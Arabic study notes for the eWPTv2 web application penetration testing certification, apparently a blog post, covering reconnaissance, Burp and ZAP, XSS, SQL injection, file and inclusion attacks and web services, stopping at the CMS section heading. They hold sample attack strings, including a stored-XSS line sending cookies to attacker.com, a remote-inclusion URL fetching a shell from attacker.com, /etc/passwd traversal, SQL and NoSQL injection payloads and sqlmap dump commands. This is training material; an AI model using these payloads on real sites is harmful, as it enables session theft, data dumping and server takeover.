---
title: "eWPTv2 Study Notes"
published: 2026-09-07
description: "practical notes covering the eWPTv2 certification"
image: "eWPTv2.png"
tags:
  - "eWPTv2"
  - "Web Application Security"
  - "CMS Security"
  - "Web Security"
  - "Enumeration"
category: "Courses Notes"
lang: "ar"
---

نوتس Web Application Penetration Testing — دليل شامل خطوة بخطوة

بعد نوتس eJPTv2، حبيت أكمل بنوتس مخصصة لاختبار اختراق تطبيقات الويب بالتفصيل، لأن الجزء ده من أكتر الأجزاء اللي بتحتاج ممارسة عملية مكثفة، مش مجرد حفظ مفاهيم.

النوتس دي هتكون بالترتيب كالآتي:

 01- Introduction to Web Application Security Testing
 02- Information Gathering
 03- Web Proxies
 04- Cross-Site Scripting (XSS)
 05- SQL Injection
 06- Common Attacks
 07- File & Resource Attacks
 08- Web Services
 09- CMS Pentesting
 10- Encoding & Filtering

قبل أي حاجة، دي تجميعة لكل الأدوات اللي هتحتاجها في عملية البينتيست بتاعتك، ومعاها التثبيت السريع:

الأداة	الوصف	التثبيت
Burp Suite	تحليل واختبار أمان تطبيقات الويب	sudo apt update && sudo apt install burpsuite
OWASP ZAP	أداة مجانية ومفتوحة المصدر لاختبار أمان الويب	sudo apt update && sudo apt install zaproxy
Nikto	ماسح أمني للثغرات المعروفة في خدمات الويب	sudo apt update && sudo apt install nikto
SQLMap	أداة آلية لاكتشاف واستغلال ثغرات SQL Injection	sudo apt update && sudo apt install sqlmap
W3af	إطار عمل كامل لاختبار أمان تطبيقات الويب	sudo apt update && sudo apt install w3af
Metasploit Framework	تطوير الثغرات واختبارها	sudo apt update && sudo apt install metasploit-framework
Skipfish	ماسح أمان لتطبيقات الويب	sudo apt update && sudo apt install skipfish
Commix	اختبار ثغرات Command Injection	sudo apt update && sudo apt install commix
RIPS	تحليل الكود المصدري واكتشاف الثغرات	تحميل من الموقع الرسمي
XSStrike	اختبار ثغرات XSS	git clone https://github.com/s0md3v/XSStrike.git
AFL (American Fuzzy Lop)	أداة Fuzzing	sudo apt update && sudo apt install afl
Grendel-Scan	فحص أمان تطبيقات الويب	تحميل من الموقع الرسمي

XSStrike تثبيت كامل:

bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
01- Introduction to Web Application Security Testing

قبل ما تدخل في أي تفصيلة تقنية، لازم تكون فاهم الصورة الكبيرة: اختبار اختراق تطبيقات الويب هو محاولة منظمة لاكتشاف الثغرات في تطبيق ويب قبل ما حد يستغلها بنية سيئة. الفرق عن اختبار اختراق الشبكات إن التركيز هنا بيبقى على منطق التطبيق نفسه — إزاي بيتعامل مع المدخلات، إزاي بيدير الجلسات والمصادقة، وإزاي بيتفاعل مع قاعدة البيانات والملفات.

هنا هبدأ بمراجعة سريعة جدًا لأشهر الثغرات، وبعدين هفصّل كل واحدة منهم لاحقًا في السكاشن المخصصة ليها.

1. جمع المعلومات (Information Gathering)

ليه بنجمع معلومات؟

دي أول خطوة، عشان نفهم التطبيق اللي بنختبره، نعرف إيه التقنيات المستخدمة فيه، ونتعرف على نقاط ضعفه المحتملة.

أدوات نستخدمها:

Nmap: بيساعدك تعرف المنافذ المفتوحة على السيرفر
WHOIS Lookup: عشان تعرف معلومات عن المالك والمزود

مثال عملي:

لو عندك موقع اسمه Netriders.academy، ممكن تستخدم Nmap كده:

bash
nmap -sS Netriders.academy

ده هيظهرلك المنافذ المفتوحة والخدمات المتاحة على السيرفر.

2. التعرف على المكونات (Component Recognition)

إيه المكونات دي؟

دي المكتبات والإضافات المستخدمة في التطبيق. لو عرفتهم، ممكن تلاقي ثغرات معروفة فيهم.

أدوات نستخدمها:

Wappalyzer: إضافة للمتصفح بتقولك التقنيات المستخدمة في أي موقع
BuiltWith: موقع تاني مفيد لمعرفة التقنيات

مثال عملي:

ممكن تستخدم Wappalyzer على example.com وتشوف إذا كان فيه مكتبات معروفة زي jQuery أو أنظمة إدارة محتوى زي WordPress.

3. اختبار الثغرات الشائعة (مراجعة سريعة)

أ. SQL Injection

طريقة بتسمح لك تخترق قاعدة البيانات من خلال إدخال بيانات خبيثة. مثال:

text
http://example.com/login.php?user=admin' OR '1'='1' -- &pass=12345

لو دخلت، يبقى فيه ثغرة SQL Injection.

ب. Cross-Site Scripting (XSS)

إنك تحط كود JavaScript ضار في التطبيق. مثال:

html

script>alert('XSS Attack');</script>

لو ظهرت الرسالة، التطبيق معرض لهجوم XSS.

ج. Cross-Site Request Forgery (CSRF)

إنك تخلي المستخدم ينفذ عمليات بدون ما يعرف، زي تغيير كلمة السر. مثال:

text
http://example.com/change-password?newpass=12345

لو المستخدم ضغط على الرابط، هتتغير كلمة السر من غير ما يعرف.

4. تحليل الاستجابة (Response Analysis)

ليه بنحلل الاستجابة؟

عشان نعرف إزاي التطبيق بيستجيب للأوامر. لو فيه معلومات حساسة أو أخطاء مفيدة، ده هيساعدنا نكتشف الثغرات.

أدوات نستخدمها: Burp Suite، OWASP ZAP لالتقاط وتحليل الطلبات والردود.

5. تقرير النتائج (Reporting)

عناصر التقرير الأساسية:

الوصف: تفاصيل الثغرة وأثرها
خطوات الإصلاح: إزاي نصلح الثغرة
الأهمية: مدى خطورة الثغرة

مثال: لو اكتشفت SQL Injection، تكتب: "في ثغرة SQL Injection في نموذج تسجيل الدخول" مع توصية "استخدم الاستعلامات المحضرة (Prepared Statements) بدل الاستعلامات الديناميكية".

دي كانت مراجعة سريعة جدًا لبعض الثغرات، ممكن تتخطاها بدون مشكلة لو عايز تروح على طول للتفاصيل الكاملة تحت.

02- Information Gathering (بالتفصيل)

السكشن ده هنعيد فيه اللي اتشرح فوق، لكن بتفاصيل أكتر شوية، وبيغطي:

Finding Website Ownership & IP Addresses
Reviewing Webserver Metafiles For Information Leakage
Search Engine Discovery
Web App Fingerprinting
Source Code Analysis
Website Crawling & Spidering
Web Server Fingerprinting
DNS Enumeration
Subdomain Enumeration
Web App Vulnerability Scanning
Automated Recon Frameworks
مقدمة

جمع المعلومات عن المواقع هي أول خطوة في أي اختبار اختراق. الهدف إنك تجمع كل حاجة تقدر عليها عن الموقع المستهدف عشان تحدد نقاط الضعف اللي ممكن تستغلها. المعلومات دي ممكن تجمعها بطريقتين: نشطة (تتعامل مع الموقع مباشرة) أو سلبية (تدور على معلومات متاحة للعامة من غير تفاعل مباشر).

إزاي تعرف ملكية الموقع وعناوين الـ IP
WHOIS: بيعرفك مين صاحب النطاق، الاسم، البريد الإلكتروني، وأحيانًا العنوان. تقدر تستخدم whois.domaintools.com
DNS Lookup: أدوات زي nslookup أو dig بتعرفك عنوان الـ IP بتاع الموقع من اسم النطاق
مراجعة ملفات الميتا عشان تعرف معلومات مسربة
ملفات زي robots.txt وhumans.txt بتبقى فيها أحيانًا معلومات مهمة بتكشف مسارات أو ملفات مش مفروض تكون ظاهرة للعامة
sitemap.xml: بيبقى عشان محركات البحث تفهرس الموقع، وأحيانًا بيكون فيه مسارات لصفحات مش ظاهرة للمستخدم العادي
البحث عن المعلومات باستخدام محركات البحث

Google Dorking — أوامر بحث متقدمة في جوجل لجلب معلومات حساسة:

text
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"

الصفحات المؤرشفة: جوجل بيحتفظ بنسخ من الصفحات القديمة، أحيانًا تلاقي فيها معلومات اتحذفت من الموقع الحالي.

بصمة تطبيق الويب
HTTP Headers: الرد اللي بييجي بعد أي طلب ممكن يحتوي على معلومات عن نوع السيرفر وإصداره. أدوات زي Wappalyzer وBuiltWith بتحدد لك الأدوات المستخدمة
صفحات الأخطاء (404): أحيانًا بتوضح نوع الخادم أو التطبيقات المستخدمة
تحليل الشيفرة المصدرية للموقع
عرض الكود المصدري: ممكن تلاقي تعليقات أو نصوص مخفية فيها معلومات مفيدة
GitLeaks: لاكتشاف أي تسريبات بيانات في مستودعات الكود زي Git
الزحف والتجسس على الموقع
OWASP ZAP و Burp Suite: بتعمل فحص شامل للموقع وتجيب كل الروابط والصفحات
Spiders: بتزحف عبر الموقع وتتبع الروابط كلها عشان تجمع معلومات عن هيكل الموقع
تحديد بصمة الخادم
Nmap: لتحديد إصدار الخادم ونظام التشغيل، والمنافذ المفتوحة، ونوع الخادم (Apache، IIS...)
Banner Grabbing: استخلاص معلومات عن الخادم من الرد اللي بييجي من الشبكة
استكشاف DNS
dnsenum: لمعرفة كل سجلات DNS زي عناوين الـ IP والخوادم الداخلية
Reverse DNS Lookup: لمعرفة النطاقات المرتبطة بعنوان IP معين
استكشاف النطاقات الفرعية
Sublist3r و Amass: للدوران على النطاقات الفرعية المرتبطة بالنطاق الرئيسي — النطاقات دي ممكن تكون فيها تطبيقات غير مؤمنة كويس
Brute-force Subdomains: تقنيات لتجربة أسماء نطاقات فرعية محتملة
فحص ثغرات تطبيقات الويب
Nikto و Acunetix: فحص شامل للموقع عن ثغرات معروفة زي XSS وSQL Injection
Fuzzing: إرسال بيانات عشوائية أو معدلة للموقع ومراقبة استجابة السيرفر لاكتشاف الثغرات
أطر العمل الآلية للتجسس
Recon-ng: إطار عمل مفتوح المصدر بيجمع المعلومات من مصادر كتير وبينظمها
SpiderFoot: أداة آلية بتجمع معلومات من محركات البحث وسجلات DNS وبتحلل الروابط بين البيانات
03- Web Proxies

السكشن ده بيغطي:

Introduction To Burp Suite & OWASP ZAP
Configuring The Burp Proxy
Burp Suite Dashboard & UI
Burp Suite Target, Intruder, Sequencer, Repeater & Decoder
Configuring The OWASP ZAP Proxy & Browser Certificate
OWASP ZAP Dashboard & UI
Crawling & Spidering With OWASP ZAP
OWASP ZAP Target Context
Directory Enumeration With ZAP & Burp
Attacking HTTP Forms With ZAP & Burp
مقدمة عن البروكسيات

البروكسيات بتساعدك تشوف كل الترافيك اللي بيعدي بين المتصفح والخادم وتعدله لو حابب. يعني، لما تدخل على موقع، تقدر تشوف كل الطلبات والاستجابات اللي بتتبعت للموقع، وتقدر تعدل فيها قبل ما توصل. الأدوات دي مهمة جدًا عشان تكتشف ثغرات زي SQL Injection وXSS.

Burp Suite و OWASP ZAP
Burp Suite: أداة قوية واحترافية بتساعدك تعمل هجمات على مواقع الويب وتكتشف الثغرات
OWASP ZAP: أداة مفتوحة المصدر، شغلها مشابه لـ Burp Suite لكنها أسهل شوية للمبتدئين
إعداد بروكسي Burp

لما تفتح Burp، هتلاقي في Proxy Tab إعدادات تشغيل البروكسي. بعدها تروح للمتصفح وتعدل إعدادات الشبكة عشان الترافيك يعدي من خلال Burp. العنوان هيبقى 127.0.0.1 والبورت غالبًا 8080.

لوحة التحكم والواجهة في Burp Suite
التاب	الوظيفة
Dashboard	ملخص عن كل الفحصات والهجمات الشغالة
Target	تحديد الموقع اللي عايز تفحصه
Proxy	مشاهدة الطلبات اللي بتتبعت وتعديلها
Intruder	هجمات زي Brute Force أو اختبار مدخلات مختلفة
Repeater	إرسال نفس الطلب مرة ورا التانية مع تعديلات صغيرة
Sequencer	تحليل مدى قوة الرموز (Tokens) المستخدمة في الجلسات
Decoder	فك أو تشفير البيانات
إعداد بروكسي OWASP ZAP وشهادة المتصفح

في Options بتضبط إعدادات البروكسي (نفس العنوان والبورت زي Burp غالبًا). عشان تقدر تتجسس على مواقع HTTPS، لازم تضيف شهادة ZAP للمتصفح — هتلاقيها في ZAP's Root CA، وبتضيفها في إعدادات أمان المتصفح.

لوحة التحكم والواجهة في OWASP ZAP
التاب	الوظيفة
Dashboard	ملخص عن الفحصات والثغرات المكتشفة
Sites	المواقع اللي اشتغلت عليها مرتبة حسب الدومين
History	كل الطلبات اللي عدت من خلال ZAP
Active Scan	فحص شامل للموقع عن ثغرات
Spider	زحف على الموقع لجمع كل الصفحات والروابط
الزحف والتجسس باستخدام OWASP ZAP

في Spider Tab، تبدأ الزحف على الموقع وتجمع كل الروابط والصفحات الموجودة، وبعد كده تبدأ Active Scan عشان تدور على ثغرات في الصفحات اللي جمعتها.

إعداد الهدف في OWASP ZAP (Target Context)

في ZAP تقدر تعمل Context للموقع اللي بتفحصه — إعدادات مخصصة لتحديد صفحات معينة أو مسارات حساسة.

استكشاف الأدلة (Directory Enumeration) باستخدام ZAP و Burp

هو إنك تدور على مجلدات أو ملفات مخفية في الموقع. أدوات زي Intruder في Burp أو Forced Browse في ZAP بتجرب أسماء مشهورة زي /admin أو /backup عشان تشوف لو فيه ملفات مخفية ممكن تدخل عليها.

مهاجمة النماذج باستخدام ZAP و Burp
في Burp، باستخدام Intruder تبعت طلبات كتير لنموذج زي صفحة تسجيل دخول، وتجرب كلمات مرور مختلفة
في ZAP، تستخدم Fuzzer أو Active Scan للهجوم على النماذج وتجربة مدخلات مختلفة لاكتشاف الثغرات
04- Cross-Site Scripting (XSS)

السكشن ده بيغطي:

Types of Cross-Site Scripting Attacks
Anatomy of a Cross-Site Scripting Attack
Introduction To Reflected XSS
Identifying & Exploiting Reflected XSS Vulnerabilities
Introduction To Stored XSS
Identifying & Exploiting Stored XSS Vulnerabilities
Introduction To DOM-Based XSS
Identifying & Exploiting DOM-Based XSS Vulnerabilities
Identifying & Exploiting XSS Vulnerabilities with automated tools
مقدمة

ثغرة XSS هي واحدة من أشهر الثغرات في تطبيقات الويب، بتسمح للمهاجم إنه يحقن أكواد ضارة (زي JavaScript) في صفحات الويب اللي بيشوفها المستخدمين. الهدف الرئيسي إن المهاجم يتحكم في متصفح الضحية ويستخدم صلاحياته — زي الوصول للكوكيز، الجلسات، أو تنفيذ أكواد على المتصفح.

أنواع هجمات XSS

1. Reflected XSS

بيحصل لما الموقع يعكس (reflect) البيانات اللي دخلها المستخدم في الرد على نفس الطلب، وده بيكون غالبًا في الـ URL.

2. Stored XSS

بيحصل لما المهاجم يحقن الأكواد الضارة في قاعدة بيانات الموقع أو مكان تخزين دائم، والأكواد دي بتتنفذ لما مستخدمين تانيين يفتحوا الصفحة — وده أخطر من الـ Reflected لأنه بيأثر على كل زوار الصفحة، مش المهاجم بس.

3. DOM-Based XSS

الأكواد الضارة بتتنفذ على مستوى المتصفح بسبب تعديل الـ DOM (Document Object Model) من غير ما يمر الطلب على الخادم أصلًا — يعني المشكلة كلها في الجافاسكريبت اللي شغال على المتصفح، مش في السيرفر.

تشريح هجوم XSS
الخطوة الأولى: المهاجم بيدور على مدخل (input) زي نموذج تسجيل أو حقل بحث يقبل بيانات من المستخدم
الخطوة الثانية: المهاجم بيدخل كود JavaScript ضار في المدخل ده
الخطوة الثالثة: الموقع بيرجع الكود الضار للمستخدمين التانيين (Stored XSS) أو للمهاجم نفسه (Reflected XSS) من غير فحص أو ترشيح
الخطوة الرابعة: الأكواد بتتنفذ في متصفح الضحية، ويحصل اللي المهاجم كان مخططه — سرقة بيانات أو تنفيذ أوامر على المتصفح
Reflected XSS بالتفصيل

بيحصل لما المهاجم يحقن كود ضار في المدخلات اللي بتتعكس في الرد على الطلب مباشرة، زي حقول البحث أو الروابط اللي فيها معلمات (parameters) زي ?search=query.

التعرف على واستغلال Reflected XSS:

تدور على مدخلات في الموقع زي نماذج أو معلمات URL بتقبل أي نوع من البيانات
تحاول تحقن كود JavaScript في المدخل ده وتشوف لو الموقع هيعكس الكود ده في الرد

مثال عملي:

text
http://example.com/search?query= script>alert(document.cookie)</script>

لو ظهر Alert فيه قيمة الكوكيز، يبقى فيه ثغرة Reflected XSS فعلية، وده معناه إن المهاجم يقدر يسرق جلسة المستخدم لو خدعه يدوس على رابط مشابه.

Stored XSS بالتفصيل

مثال عملي: لو فيه صفحة تعليقات في مدونة، وحطيت في خانة التعليق:

html
 script fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>

ولو الموقع خزّن التعليق ده وعرضه لكل الزوار من غير تنقية، كل زائر يفتح الصفحة كوكيز جلسته هتتبعت تلقائيًا للمهاجم.

DOM-Based XSS بالتفصيل

مثال عملي: لو الموقع بياخد قيمة من الـ URL Fragment (اللي بعد #) ويحطها مباشرة في الصفحة بجافاسكريبت زي:

javascript
document.getElementById("welcome").innerHTML = location.hash.substring(1);

فتقدر تحقن:

text
http://example.com/page.html#<img src=x onerror=alert(1)>

المشكلة هنا إن السيرفر أصلًا مش شايف حاجة، الترميز اللي بعد # مبيتبعتش للسيرفر، فالفحص لازم يركز على الكود اللي شغال في المتصفح مش على الردود بتاعة السيرفر.

الاكتشاف الآلي لثغرات XSS

XSStrike أداة متخصصة في اكتشاف واستغلال ثغرات XSS بشكل آلي:

bash
python3 xsstrike.py -u "http://example.com/search?query=test"

كمان Burp Suite Scanner وOWASP ZAP Active Scan بيقدروا يكتشفوا XSS بشكل آلي أثناء فحصهم الشامل للموقع.

05- SQL Injection

السكشن ده بيغطي:

Types of SQL Injection Vulnerabilities
Introduction to Databases, DBMS, Relational Databases and NoSQL Databases
SQL Fundamentals
Hunting for SQL Injection Vulnerabilities
Identifying & Exploiting In-Band SQL Injection Vulnerabilities (Error-Based SQLi & UNION-Based SQLi)
Identifying & Exploiting Blind SQL Injection Vulnerabilities (Time-Based SQLi & Boolean-Based SQLi)
Identifying & Exploiting SQLi vulnerabilities with automated tools like SQLMap
Pentesting NoSQL Database
مقدمة

ثغرة SQL Injection من أخطر الثغرات الأمنية في تطبيقات الويب، لأنها بتسمح للمهاجم إنه يتلاعب بقاعدة البيانات اللي ورا التطبيق من خلال إدخال أكواد SQL ضارة في المدخلات. الهدف الأساسي هو الوصول لبيانات حساسة أو تنفيذ أوامر غير مصرح بها على قاعدة البيانات.

أنواع ثغرات SQL Injection
In-Band SQLi: المهاجم بيحصل على النتائج مباشرة في نفس القناة اللي أرسل فيها الطلب. أشهر أشكاله Error-Based SQLi وUNION-Based SQLi
Blind SQLi: مفيش رد مباشر من قاعدة البيانات، لكن المهاجم بيعتمد على تغيير سلوك التطبيق عشان يستنتج البيانات. أشهر أنواعه Boolean-Based SQLi وTime-Based SQLi
Out-of-Band SQLi: المهاجم بيستخدم قنوات خارجية عشان يحصل على الردود، زي إرسال النتائج لعنوان خارجي
مقدمة عن قواعد البيانات والـ DBMS
قواعد البيانات (Databases): المكان اللي بيتم فيه تخزين البيانات بشكل منظم لتسهيل استرجاعها
DBMS: الأنظمة اللي بتسمح لك بالتفاعل مع قواعد البيانات، زي MySQL وPostgreSQL وOracle
قواعد بيانات علائقية (Relational): بتعتمد على جداول مترابطة، زي MySQL وPostgreSQL
قواعد بيانات غير علائقية (NoSQL): مبتعتمدش على الجداول، بتخزن البيانات بشكل غير منظم، زي MongoDB وCouchDB
أساسيات SQL

أوامر SQL الأساسية:

SELECT: لاسترجاع البيانات
INSERT: لإضافة بيانات جديدة
UPDATE: لتعديل البيانات
DELETE: لحذف البيانات
البحث عن ثغرات SQL Injection
تدور على مدخلات في التطبيق زي حقول البحث أو نماذج تسجيل الدخول اللي بتتفاعل مع قاعدة البيانات
تحاول تحقن كود SQL بسيط زي ' OR '1'='1 وتشوف لو التطبيق بيستجيب بنتائج غير متوقعة
تستخدم أدوات زي Burp Suite لإرسال الطلبات وتعديل المدخلات لاكتشاف الثغرات
In-Band SQLi (Error-Based & UNION-Based)

Error-Based SQLi: المهاجم بيستغل أخطاء قاعدة البيانات اللي بتظهر في الردود عشان يستخرج معلومات.

UNION-Based SQLi — مثال:

sql
' UNION SELECT username, password FROM users --
Blind SQLi (Boolean-Based & Time-Based)

Boolean-Based SQLi: بتعتمد على تغيير سلوك التطبيق بناءً على استعلام صحيح أو خطأ:

sql
' AND 1=1 --

لو التطبيق اشتغل زي ما هو، جرب:

sql
' AND 1=2 --

لو حصل تغيير في السلوك (اختفاء بيانات كانت ظاهرة قبل كده مثلًا)، يبقى فيه ثغرة.

Time-Based SQLi: بتستخدم أوامر تأخير الوقت عشان تستنتج البيانات بناءً على وقت الاستجابة:

sql
' OR IF(1=1, SLEEP(5), 0) --

لو الصفحة أخدت 5 ثواني إضافية عشان ترد، يبقى الشرط بيتنفذ فعليًا جوا قاعدة البيانات.

الاكتشاف والاستغلال الآلي بـ SQLMap
bash
sqlmap -u "http://site.com/page?id=1"

مثال عملي متكامل:

bash
sqlmap -u "http://site.com/page?id=1" --dbs
sqlmap -u "http://site.com/page?id=1" -D webapp_db --tables
sqlmap -u "http://site.com/page?id=1" -D webapp_db -T users --dump

الأوامر دي بترجع قواعد البيانات، بعدها الجداول، وفي الآخر البيانات نفسها.

اختبار اختراق قواعد بيانات NoSQL

قواعد بيانات NoSQL مختلفة في البنية وطريقة استغلال الثغرات مقارنة بالعلائقية — الهجمات فيها بتعتمد على أكواد زي JavaScript بدل SQL. لو قاعدة البيانات بتستخدم MongoDB، ممكن تحقن:

json
{"$ne": null}

كمثال، لو حقل الباسورد في طلب تسجيل الدخول بيقبل JSON، إدخال {"$ne": null} بدل الباسورد الحقيقي ممكن يخلي الاستعلام يرجع "صح" لأي مستخدم موجود، لأن المقارنة بقت "الباسورد لا يساوي null" بدل مطابقة القيمة الفعلية.

06- Common Attacks

السكشن ده بيغطي:

HTTP Method & Authentication Testing
Sensitive Data Exposure
Broken Authentication Attacks
Session Security Testing (Session Hijacking, Session Fixation & CSRF)
Injection & Input Validation Attacks (Command Injection, Code Injection)
Testing For Security Misconfigurations
Exploiting Vulnerable & Outdated Components
اختبار طرق HTTP والمصادقة

طرق HTTP: بتعمل اختبار على الطرق المختلفة زي GET, POST, PUT, DELETE، عشان تشوف لو فيه ثغرات. ساعات السيرفرات بتكون مش متأمنة كويس وبتسمح بطرق زي DELETE لناس مش مفروض يكون عندهم صلاحيات.

اختبار المصادقة: بتشوف إزاي الموقع بيعمل تسجيل دخول للمستخدمين، لو فيه تشفير قوي، ولو بيدير الأخطاء بطريقة صح. بتدور على تخمين الباسوردات، كلمات مرور ضعيفة، أو غياب المصادقة متعددة العوامل (MFA).

تعريض البيانات الحساسة (Sensitive Data Exposure)

بتحصل لما الموقع يكشف بيانات حساسة زي معلومات شخصية، أرقام كروت ائتمان، أو بيانات صحية.

الاختبار: تتأكد إن البيانات متشفرة سواء وهي بتتنقل أو محفوظة، وتستخدم Burp Suite للتأكد إن البيانات الحساسة مش بتتبعت عبر HTTP العادي، وإن فيه رؤوس أمان زي Strict-Transport-Security.

أمثلة: بيانات حساسة ظاهرة في عناوين URLs، في رسائل الخطأ، أو في الكوكيز.

هجمات المصادقة المكسورة (Broken Authentication)
مهاجمة نماذج تسجيل الدخول: تخمين كلمات المرور، استخدام بيانات مسربة، أو استغلال كلمات مرور ضعيفة. لو الموقع مش عامل تحديد للمحاولات أو مش مركب CAPTCHA، بيبقى سهل تهجمه
تجاوز المصادقة: سرقة الجلسات (Session Hijacking)، تعديل طلبات HTTP، أو استغلال أخطاء في التحكم بالوصول (زي تعديل الروابط عشان توصل لأماكن مش مفروض تكون ليك)
اختبار أمان الجلسات
سرقة الجلسات (Session Hijacking): المهاجم بيستغل الكوكيز اللي بتحدد جلستك وياخدها عشان يتحكم في حسابك. بتستخدم Burp Suite لتشوف لو الكوكيز محمية بخصائص زي HttpOnly وSecure
ثبات الجلسة (Session Fixation): المهاجم بيحدد معرف الجلسة قبل ما تسجل دخولك، ولما تدخل بحسابك هو كده بقى عنده نفس المعرف
CSRF: بيحصل لما يخدعك المهاجم عشان تعمل حاجة على موقع أنت مسجل فيه من غير ما تعرف، عشان كده المواقع لازم تستخدم رموز حماية خاصة (CSRF Tokens)
هجمات الحقن والتحقق من المدخلات
حقن الأوامر (Command Injection): استغلال ثغرات في معالجة مدخلات المستخدم لتشغيل أوامر على النظام
حقن الأكواد (Code Injection): إدخال بيانات ضارة جوا كود الموقع نفسه، وده بيخلي المهاجم يقدر يشغل أكواد على السيرفر

الاختبار: استخدام Burp Suite's Intruder لحقن بيانات ومراقبة استجابة السيرفر، والتأكد إن التطبيق بيعمل تعقيم للمدخلات (Sanitization).

اختبار تكوينات الأمان الخاطئة

ساعات التطبيقات أو السيرفرات بيكون فيها تكوينات غلط زي إعدادات افتراضية، برامج قديمة، أو خدمات شغالة من غير داعي.

الاختبار: فحص المنافذ المفتوحة والخدمات الغير محتاجة ونسخ البرامج القديمة، باستخدام Nmap وNikto.

أفضل الممارسات: التأكد من الإعدادات الأمنية صح، وقفل كل الخدمة الغير محتاجة، واستخدام إعدادات أمان قوية.

استغلال المكونات الضعيفة وغير المحدثة

لو التطبيق بيستخدم مكتبات أو برامج قديمة، ده بيخليه عرضة للهجمات المعروفة.

الاختبار: استخدام أدوات زي OWASP Dependency-Check للتأكد لو فيه مكونات قديمة ومعروفة إنها فيها ثغرات (CVEs).

الاستغلال: الدوران على ثغرات معروفة في قواعد بيانات الـ CVEs وعمل حمولات (Payloads) تستغلها للهجوم.

07- File & Resource Attacks

السكشن ده بيغطي:

Introduction To Arbitrary File Upload Vulnerabilities
Bypassing File Upload Extension Filters
Bypassing PHPx Blacklists
Introduction To Directory/Path Traversal Vulnerabilities
Identifying & Exploiting Directory/Path Traversal Vulnerabilities
Introduction To LFI & RFI Vulnerabilities
Identifying & Exploiting LFI & RFI Vulnerabilities
مقدمة في ثغرات رفع الملفات العشوائية

الموقع يسمحلك ترفع ملفات، لكن مش بيفحصها كويس — ده ممكن يخلي المهاجم يرفع ملفات خبيثة زي سكربتات PHP، اللي ممكن تنفذ أوامر على السيرفر.

مثال: لو عندك نموذج رفع ملفات مش مطبق فيه حماية قوية، ممكن حد يرفع ملف اسمه shell.php ويستخدمه عشان يتحكم في السيرفر.

تجاوز فلاتر امتداد الملفات

المواقع غالبًا بتحط قيود على أنواع الملفات المسموح بها، زي صور فقط.

إزاي تتجاوزها؟

رفع ملف باسم غير عادي، مثلًا shell.php.jpg، فيبقى شكله كأنه صورة
استخدام "double extension" زي shell.php.gif عشان تخدع السيرفر
تجاوز القوائم السوداء (PHPx Blacklists)

القوائم السوداء بتبقى قائمة بأنواع الملفات الممنوعة، زي ملفات PHP.

تجاوزها: رفع ملف بامتداد مختلف زي .php5، أو استخدام حيل لإخفاء الكود جوا الملف.

Directory/Path Traversal

بتحصل لما الموقع يسمح للمهاجم إنه يوصل لملفات النظام المهمة عن طريق إدخال مسارات غير صحيحة، عادةً بإدخال رموز زي ../ عشان ينتقل لأعلى المجلدات.

التحديد والاستغلال:

text
http://example.com/download?file=../../etc/passwd

لو نجحت، تقدر تقرأ ملفات مهمة أو حتى تنفذ أوامر ضارة على السيرفر.

LFI و RFI
LFI (Local File Inclusion): تقدر تحمل ملف موجود على السيرفر نفسه
RFI (Remote File Inclusion): تقدر تحمل ملف من الإنترنت — RFI أخطر لأنه بيسمح بتنفيذ كود خبيث من برة السيرفر بالكامل

التحديد والاستغلال:

text
# LFI
index.php?page=../../etc/passwd

# RFI
index.php?page=http://attacker.com/shell.txt
LFI: تقدر تقرأ ملفات مهمة زي /etc/passwd
RFI: تقدر تستخدمها عشان ترفع سكربت ضار وتنفذه عن بعد

مثال عملي متكامل: لقيت باراميتر page في رابط زي http://example.com/index.php?page=about.php بيحمّل صفحات من السيرفر. جربت ?page=../../../../etc/passwd ولقيت محتوى الملف ظاهر في الصفحة — دي ثغرة LFI مؤكدة. لو السيرفر مسموح فيه بتفعيل allow_url_include، ممكن أرفع ده لثغرة RFI وأنفذ Web Shell كامل عن بعد.

08- Web Services

السكشن ده بيغطي:

Web Service Implementations
WSDL Language Fundamentals
Web Service Security Testing
SOAP Web Service Security Testing
مقدمة في خدمات الويب

خدمات الويب هي تطبيقات تفاعلية بتتيح نقل البيانات والتفاعل بين أنظمة مختلفة عبر الإنترنت، وبتستخدم بروتوكولات محددة زي HTTP وSOAP وREST.

أنواع خدمات الويب:

SOAP: بتعتمد على XML لتبادل الرسائل وتستخدم بروتوكولات زي HTTP وSMTP
REST: بتعتمد على أساليب HTTP (GET, POST, PUT, DELETE) وتستخدم JSON أو XML لتبادل البيانات

استخداماتها: تطبيقات زي الخدمات المصرفية عبر الإنترنت، منصات التجارة الإلكترونية، وتكامل الأنظمة.

تنفيذ خدمات الويب
مبنية على SOAP: بيتم إنشاء الخدمة باستخدام XML وتُعرَّف في ملف WSDL
مبنية على REST: بتعتمد على بناء API باستخدام HTTP، وغالبًا بتكون بسيطة وسهلة الاستخدام

أمثلة: استخدام خدمات زي Amazon Web Services (AWS) أو Google APIs لدمج وظائف محددة في التطبيقات.

أساسيات لغة WSDL

WSDL هي لغة وصف خدمات الويب، بتحدد إزاي العملاء بيتفاعلوا مع الخدمة.

مكونات WSDL:

Types: تعريف أنواع البيانات المستخدمة في الرسائل
Messages: تعريف البيانات المتبادلة بين العميل والخدمة
Port Type: تحديد العمليات المتاحة في الخدمة
Binding: تحديد بروتوكولات الاتصال والتنسيقات
Service: تحديد عنوان الخدمة ومكان الوصول إليها
اختبار أمان خدمات الويب

خدمات الويب ممكن تكون هدف لهجمات كتير، زي هجمات انتحال الهوية، التلاعب بالرسائل، والاعتماد على معلومات غير موثوقة.

تقنيات الاختبار:

اختبار الضعف: تحديد الثغرات المعروفة في الخدمة
اختبار الولوج: التأكد إن المستخدمين المصرح لهم بس هما اللي يقدروا يوصلوا للوظائف المناسبة
تحليل التهديدات: فحص السيناريوهات المحتملة للهجمات وتقييم المخاطر
اختبار أمان خدمات SOAP

SOAP بتعتمد على XML، وده بيخليها عرضة لهجمات زي XML Injection وXXE (XML External Entity).

استراتيجيات الاختبار:

تحليل الرسائل: التأكد إن رسائل SOAP مشفرة وآمنة
فحص WSDL: التأكد إن ملفات WSDL مش بتعرض معلومات حساسة
اختبار التوقيع الرقمي: التأكد إن الرسائل موقّعة وبتستخدم SSL/TLS
09- CMS Pentesting

السكشن ده بيغطي:

Introduction To CMS Security Testing
CMS Security Testing Methodology
WordPress Security Testing Methodology
WordPress Information Gathering & Enumeration
WordPress Vulnerability Scanning
WordPress Authentication Attacks
WordPress Plugin Exploitation
WordPress Black-Box Penetration Testing
مقدمة عن أنظمة إدارة المحتوى (CMS)

